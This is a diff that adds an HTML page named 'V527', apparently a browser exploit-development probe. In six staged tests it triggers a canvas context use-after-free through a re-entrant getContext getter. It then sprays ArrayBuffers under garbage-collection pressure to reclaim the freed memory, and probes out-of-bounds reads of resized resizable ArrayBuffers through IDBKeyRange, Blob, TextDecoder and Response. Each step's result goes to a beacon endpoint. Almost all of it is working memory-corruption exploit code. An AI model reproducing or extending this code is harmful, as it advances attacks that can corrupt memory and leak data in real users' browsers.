@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V527</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V527 — AB Reclaim + RAB Inverted Check
+Loading probe...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+
+// Beacon helper
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/beacon/V527-'+tag,false);
+    x.setRequestHeader('Content-Type','text/plain');
+    x.send(msg);
+  }catch(e){}
+}
+
+B('BOOT',navigator.userAgent);
+
+// === T1: Same-type alias establishment (baseline) ===
+setTimeout(function(){
+  try{
+    B('T1-START','same-type alias baseline');
+    var c=document.createElement('canvas');
+    var inner;
+    var outer=c.getContext('2d',{get desynchronized(){inner=c.getContext('2d');return false}});
+    if(!inner){B('T1-DEAD','no inner');return}
+
+    var spray=[],ctxs=[];
+    for(var i=0;i<200;i++){
+      var sc=document.createElement('canvas');sc.width=1;sc.height=1;
+      var sx=sc.getContext('2d');
+      if(sx){sx.lineWidth=500+i;spray.push(sc);ctxs.push(sx)}
+    }
+
+    var lw=inner.lineWidth;
+    var idx=-1;
+    for(var i=0;i<ctxs.length;i++){
+      if(ctxs[i].lineWidth===lw&&lw===(500+i)){idx=i;break}
+    }
+
+    if(idx<0){B('T1-NOALIAS','lw='+lw);return}
+    B('T1-ALIAS','idx='+idx+' lw='+lw);
+
+    // Confirm bidirectional
+    ctxs[idx].lineWidth=1337.42;
+    var readback=inner.lineWidth;
+    B('T1-BIDIR','set=1337.42 read='+readback+' match='+(readback===1337.42));
+
+    // Store for T2
+    window._t1={spray:spray,ctxs:ctxs,inner:inner,idx:idx,canvas:c};
+  }catch(e){B('T1-ERR',''+e)}
+},500);
+
+// === T2: Free alias target + AB spray → check if inner reads AB data ===
+setTimeout(function(){
+  try{
+    B('T2-START','free alias + AB spray');
+    var t1=window._t1;
+    if(!t1||t1.idx<0){B('T2-SKIP','no alias from T1');return}
+
+    // Verify alias still alive
+    var preCheck=t1.inner.lineWidth;
+    B('T2-PRE','lineWidth='+preCheck);
+
+    // Record the alias canvas and null it out
+    var targetCanvas=t1.spray[t1.idx];
+    var targetCtx=t1.ctxs[t1.idx];
+
+    // Write distinctive value through alias for later comparison
+    targetCtx.lineWidth=7777.77;
+    B('T2-MARKED','inner reads='+t1.inner.lineWidth);
+
+    // Kill the aliased canvas to free its context
+    t1.spray[t1.idx]=null;
+    t1.ctxs[t1.idx]=null;
+    targetCanvas.width=0;targetCanvas.height=0;
+    targetCanvas=null;targetCtx=null;
+
+    // GC pressure
+    var gcJunk=[];
+    for(var g=0;g<100;g++) gcJunk.push(new ArrayBuffer(65536));
+    gcJunk=null;
+
+    // MORE GC — trigger collection
+    for(var g=0;g<5;g++){
+      var tmp=[];
+      for(var j=0;j<200;j++) tmp.push(new ArrayBuffer(32768));
+      tmp=null;
+    }
+
+    B('T2-GC','pressure done');
+
+    // Now spray 768B ABs with known pattern
+    // Context2D is 768 bytes (size class)
+    // State.lineWidth is at some offset within the inline State
+    // We'll write a distinctive float64 pattern at EVERY 8-byte slot
+    var MARKER=9999.99;
+    var markerBytes=new ArrayBuffer(8);
+    new Float64Array(markerBytes)[0]=MARKER;
+    var markerU8=new Uint8Array(markerBytes);
+
+    var abs=[];
+    for(var i=0;i<500;i++){
+      var ab=new ArrayBuffer(768);
+      var u8=new Uint8Array(ab);
+      // Fill entire buffer with marker pattern
+      for(var off=0;off<768;off+=8){
+        u8[off]=markerU8[0];u8[off+1]=markerU8[1];
+        u8[off+2]=markerU8[2];u8[off+3]=markerU8[3];
+        u8[off+4]=markerU8[4];u8[off+5]=markerU8[5];
+        u8[off+6]=markerU8[6];u8[off+7]=markerU8[7];
+      }
+      abs.push(ab);
+    }
+    B('T2-SPRAYED','n='+abs.length);
+
+    // The critical moment: read through stale inner wrapper
+    // If AB reclaimed the context slot:
+    //   m_stateStack.m_buffer = (8 bytes of 9999.99 pattern) → random address → CRASH at state()
+    //   This crash proves AB reclaim happened
+    // If AB did NOT reclaim:
+    //   Context still exists (GC didn't collect) → reads 7777.77
+    //   Or context was decommitted → CRASH at different address
+    try{
+      var lwAfter=t1.inner.lineWidth;
+      B('T2-READ','lineWidth='+lwAfter);
+
+      if(lwAfter===7777.77){
+        B('T2-ALIVE','context NOT freed - GC did not collect it');
+      } else if(lwAfter===MARKER){
+        B('T2-RECLAIMED','*** AB RECLAIM CONFIRMED *** lineWidth=marker');
+      } else if(lwAfter===1){
+        B('T2-DEFAULT','lineWidth=1 → context was freed and re-init or AB zeroed');
+      } else {
+        B('T2-UNKNOWN','lineWidth='+lwAfter+' unexpected value');
+      }
+
+      // Also check globalAlpha
+      try{
+        var ga=t1.inner.globalAlpha;
+        B('T2-GA','globalAlpha='+ga);
+      }catch(e2){B('T2-GA-ERR',''+e2)}
+
+    }catch(e){
+      B('T2-READ-ERR',''+e);
+    }
+
+    window._t2abs=abs;
+  }catch(e){B('T2-ERR',''+e)}
+},5000);
+
+// === T3: Independent UAF + immediate AB spray (no same-type step) ===
+setTimeout(function(){
+  try{
+    B('T3-START','fresh UAF + immediate AB spray');
+    var c=document.createElement('canvas');
+    var inner3;
+    var outer3=c.getContext('2d',{get desynchronized(){inner3=c.getContext('2d');return false}});
+    if(!inner3){B('T3-DEAD','null');return}
+
+    // Don't do same-type spray. Just AB spray immediately.
+    // The freed context should be in bmalloc's free list for 768B
+    var abs3=[];
+    for(var i=0;i<500;i++){
+      var ab=new ArrayBuffer(768);
+      var f64=new Float64Array(ab);
+      // Write index marker at every slot
+      for(var j=0;j<96;j++) f64[j]=3000+j;
+      abs3.push(ab);
+    }
+    B('T3-SPRAYED','n='+abs3.length);
+
+    // Read — this WILL crash if AB reclaimed (m_buffer points to garbage)
+    // But we send the beacon first
+    try{
+      var lw3=inner3.lineWidth;
+      B('T3-READ','lineWidth='+lw3);
+
+      // Check if it matches any of our marker values
+      for(var j=0;j<96;j++){
+        if(lw3===(3000+j)){
+          B('T3-MATCH','lineWidth matches f64['+j+'] = byte offset '+(j*8));
+          break;
+        }
+      }
+    }catch(e){B('T3-READ-ERR',''+e)}
+
+    window._t3abs=abs3;
+  }catch(e){B('T3-ERR',''+e)}
+},10000);
+
+// === T4: RAB in-bounds IDBKeyRange test ===
+setTimeout(function(){
+  try{
+    B('T4-START','RAB inverted check via IDBKeyRange');
+
+    if(typeof IDBKeyRange==='undefined'){B('T4-DEAD','no IDBKeyRange');return}
+
+    // Baseline: normal AB
+    try{
+      var normBuf=new ArrayBuffer(64);
+      var normView=new Uint8Array(normBuf);
+      for(var i=0;i<64;i++) normView[i]=0xAA;
+      var k1=IDBKeyRange.only(normView);
+      B('T4-NORM','key created, lower type='+(typeof k1.lower));
+      // k1.lower should be an ArrayBuffer with 64 bytes of 0xAA
+      if(k1.lower instanceof ArrayBuffer){
+        var r1=new Uint8Array(k1.lower);
+        B('T4-NORM-DATA','len='+r1.length+' [0]='+r1[0].toString(16));
+      }
+    }catch(e){B('T4-NORM-ERR',''+e)}
+
+    // RAB in-bounds view
+    try{
+      var rab=new ArrayBuffer(256,{maxByteLength:256});
+      B('T4-RAB-CREATED','resizable='+rab.resizable+' byteLength='+rab.byteLength+' maxByteLength='+rab.maxByteLength);
+
+      var rabView=new Uint8Array(rab,0,256);
+      for(var i=0;i<256;i++) rabView[i]=0xBB;
+      B('T4-RAB-FILLED','view.length='+rabView.length+' view.byteOffset='+rabView.byteOffset);
+
+      var k2=IDBKeyRange.only(rabView);
+      B('T4-RAB-KEY','created');
+      if(k2.lower instanceof ArrayBuffer){
+        var r2=new Uint8Array(k2.lower);
+        B('T4-RAB-INBOUNDS','len='+r2.length+' [0]='+(r2.length>0?r2[0].toString(16):'empty'));
+        // len=0 → inverted check active (C++ sees byteLength=0)
+        // len=256 → inverted check NOT present (fixed or different path)
+      }
+    }catch(e){B('T4-RAB-ERR',''+e)}
+
+    // RAB OOB (after resize)
+    try{
+      var rab2=new ArrayBuffer(0x2000,{maxByteLength:0x2000});
+      var oobView=new Uint8Array(rab2,0x1000,0x1000);
+      for(var i=0;i<0x1000;i++) oobView[i]=0x42;
+      B('T4-OOB-FILLED','view.length='+oobView.length);
+
+      rab2.resize(0x800);
+      B('T4-OOB-RESIZED','buf.byteLength='+rab2.byteLength+' view.length='+oobView.length);
+
+      var k3=IDBKeyRange.only(oobView);
+      B('T4-OOB-KEY','created');
+      if(k3.lower instanceof ArrayBuffer){
+        var r3=new Uint8Array(k3.lower);
+        B('T4-OOB-DATA','len='+r3.length);
+        if(r3.length>0){
+          var hex=[];
+          for(var i=0;i<Math.min(32,r3.length);i++) hex.push(('0'+r3[i].toString(16)).slice(-2));
+          B('T4-OOB-HEX',hex.join(' '));
+        }
+      }
+    }catch(e){B('T4-OOB-ERR',''+e)}
+
+    B('T4-DONE','complete');
+  }catch(e){B('T4-ERR',''+e)}
+},15000);
+
+// === T5: Blob + TextDecoder with RAB views ===
+setTimeout(function(){
+  try{
+    B('T5-START','Blob/TextDecoder RAB sinks');
+
+    // Blob with in-bounds RAB view
+    try{
+      var rab=new ArrayBuffer(256,{maxByteLength:256});
+      var rv=new Uint8Array(rab,0,256);
+      for(var i=0;i<256;i++) rv[i]=0xEE;
+      var blob=new Blob([rv]);
+      B('T5-BLOB-IN','size='+blob.size);
+      // size=0 would indicate Blob uses C++ byteLength (inverted)
+      // size=256 would indicate Blob uses JS length or different path
+    }catch(e){B('T5-BLOB-IN-ERR',''+e)}
+
+    // Blob after resize (OOB)
+    try{
+      var rab2=new ArrayBuffer(512,{maxByteLength:512});
+      var rv2=new Uint8Array(rab2,0,512);
+      for(var i=0;i<512;i++) rv2[i]=0xDD;
+      rab2.resize(64);
+      var blob2=new Blob([rv2]);
+      B('T5-BLOB-OOB','size='+blob2.size+' view.length='+rv2.length);
+    }catch(e){B('T5-BLOB-OOB-ERR',''+e)}
+
+    // TextDecoder with RAB
+    try{
+      var rab3=new ArrayBuffer(32,{maxByteLength:32});
+      var rv3=new Uint8Array(rab3,0,32);
+      var hello=[72,69,76,76,79];
+      for(var i=0;i<hello.length;i++) rv3[i]=hello[i];
+      var dec=new TextDecoder();
+      var txt=dec.decode(rv3);
+      B('T5-TD-IN','len='+txt.length+' val="'+txt.substring(0,10)+'"');
+      // len=0 → C++ path, inverted check
+      // len=32 → normal
+    }catch(e){B('T5-TD-ERR',''+e)}
+
+    // TextDecoder after resize
+    try{
+      var rab4=new ArrayBuffer(64,{maxByteLength:64});
+      var rv4=new Uint8Array(rab4,0,64);
+      for(var i=0;i<64;i++) rv4[i]=0x41; // 'A'
+      rab4.resize(8);
+      var txt2=dec.decode(rv4);
+      B('T5-TD-OOB','len='+txt2.length+' val="'+txt2.substring(0,20)+'"');
+    }catch(e){B('T5-TD-OOB-ERR',''+e)}
+
+    B('T5-DONE','complete');
+  }catch(e){B('T5-ERR',''+e)}
+},20000);
+
+// === T6: Fetch/Response body with RAB view ===
+setTimeout(function(){
+  try{
+    B('T6-START','Response body RAB sink');
+
+    try{
+      var rab=new ArrayBuffer(128,{maxByteLength:128});
+      var rv=new Uint8Array(rab,0,128);
+      for(var i=0;i<128;i++) rv[i]=0xCC;
+
+      // Create Response from RAB view
+      var resp=new Response(rv);
+      resp.arrayBuffer().then(function(ab){
+        var u8=new Uint8Array(ab);
+        B('T6-RESP-IN','len='+u8.length+' [0]='+(u8.length>0?u8[0].toString(16):'empty'));
+      }).catch(function(e){B('T6-RESP-IN-ERR',''+e)});
+    }catch(e){B('T6-RESP-IN-ERR2',''+e)}
+
+    // OOB Response
+    try{
+      var rab2=new ArrayBuffer(256,{maxByteLength:256});
+      var rv2=new Uint8Array(rab2,0,256);
+      for(var i=0;i<256;i++) rv2[i]=0xFF;
+      rab2.resize(32);
+
+      var resp2=new Response(rv2);
+      resp2.arrayBuffer().then(function(ab){
+        var u8=new Uint8Array(ab);
+        B('T6-RESP-OOB','len='+u8.length+' [0]='+(u8.length>0?u8[0].toString(16):'empty'));
+        if(u8.length>0){
+          var hex=[];
+          for(var i=0;i<Math.min(16,u8.length);i++) hex.push(('0'+u8[i].toString(16)).slice(-2));
+          B('T6-RESP-OOB-HEX',hex.join(' '));
+        }
+      }).catch(function(e){B('T6-RESP-OOB-ERR',''+e)});
+    }catch(e){B('T6-RESP-OOB-ERR2',''+e)}
+
+    B('T6-DONE','fetch sink tests launched');
+  }catch(e){B('T6-ERR',''+e)}
+},25000);
+
+setTimeout(function(){B('COMPLETE','all tests done')},30000);
+</script></body></html>
